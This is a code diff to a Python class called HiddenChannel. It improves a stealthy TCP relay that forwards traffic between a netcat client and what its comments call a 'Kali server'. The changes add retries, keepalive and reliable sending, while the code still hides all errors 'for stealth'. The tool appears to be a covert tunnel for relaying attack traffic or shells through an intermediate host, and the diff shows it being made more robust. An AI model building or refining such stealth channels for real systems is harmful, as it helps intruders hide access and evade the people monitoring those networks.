@@ -48,10 +48,29 @@ class HiddenChannel:
         target_socket = None
         
         try:
-            # Create connection to target
-            target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            target_socket.settimeout(10)
-            target_socket.connect((self.target_host, self.target_port))
+            # Set client socket options for better performance
+            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+            
+            # Create connection to target with retries
+            for attempt in range(3):  # Try 3 times
+                try:
+                    target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    target_socket.settimeout(5)
+                    target_socket.connect((self.target_host, self.target_port))
+                    break  # Connection successful
+                except Exception as e:
+                    if target_socket:
+                        target_socket.close()
+                        target_socket = None
+                    if attempt == 2:  # Last attempt failed
+                        return
+                    time.sleep(0.5)  # Wait before retry
+            
+            if not target_socket:
+                return
+                
+            # Set target socket options
+            target_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
             
             # Store connection info
             self.connections[connection_id] = {
@@ -61,15 +80,24 @@ class HiddenChannel:
                 'bytes_received': 0
             }
             
-            # Use simple select-based forwarding
+            # Use improved forwarding
             self.simple_forward(client_socket, target_socket, connection_id)
             
-        except Exception as e:
+        except Exception:
             pass  # Silent failure for stealth
         finally:
-            # Clean up sockets
+            # Clean up sockets properly
+            try:
+                client_socket.shutdown(socket.SHUT_RDWR)
+            except:
+                pass
             try:
                 client_socket.close()
+            except:
+                pass
+            try:
+                if target_socket:
+                    target_socket.shutdown(socket.SHUT_RDWR)
             except:
                 pass
             try:
@@ -82,38 +110,46 @@ class HiddenChannel:
     
     def simple_forward(self, client_socket, target_socket, connection_id):
         """Simple bidirectional forwarding using select"""
-        sockets = [client_socket, target_socket]
-        
         try:
             while self.is_running:
-                # Wait for data on either socket
-                ready, _, error = select.select(sockets, [], sockets, 1.0)
+                # Wait for data on either socket with longer timeout
+                ready, _, error = select.select([client_socket, target_socket], [], [client_socket, target_socket], 2.0)
                 
+                # Check for socket errors
                 if error:
                     break
+                
+                # If no sockets are ready, continue the loop
+                if not ready:
+                    continue
                     
                 for sock in ready:
                     try:
                         data = sock.recv(4096)
                         if not data:
+                            # Connection closed
                             return
                         
                         # Forward data to the other socket
                         if sock is client_socket:
-                            # Data from client to target
-                            target_socket.send(data)
+                            # Data from client (netcat) to target (Kali server)
+                            target_socket.sendall(data)  # Use sendall for reliable sending
                             if connection_id in self.connections:
                                 self.connections[connection_id]['bytes_sent'] += len(data)
                         else:
-                            # Data from target to client
-                            client_socket.send(data)
+                            # Data from target (Kali server) to client (netcat)
+                            client_socket.sendall(data)  # Use sendall for reliable sending
                             if connection_id in self.connections:
                                 self.connections[connection_id]['bytes_received'] += len(data)
-                            
-                    except socket.error as e:
+                                
+                    except socket.error:
+                        # Socket error occurred, close connection
+                        return
+                    except Exception:
+                        # Other error, close connection
                         return
                         
-        except Exception as e:
+        except Exception:
             pass  # Silent failure for stealth
     
     def forward_data(self, source_socket, destination_socket, connection_id, direction):
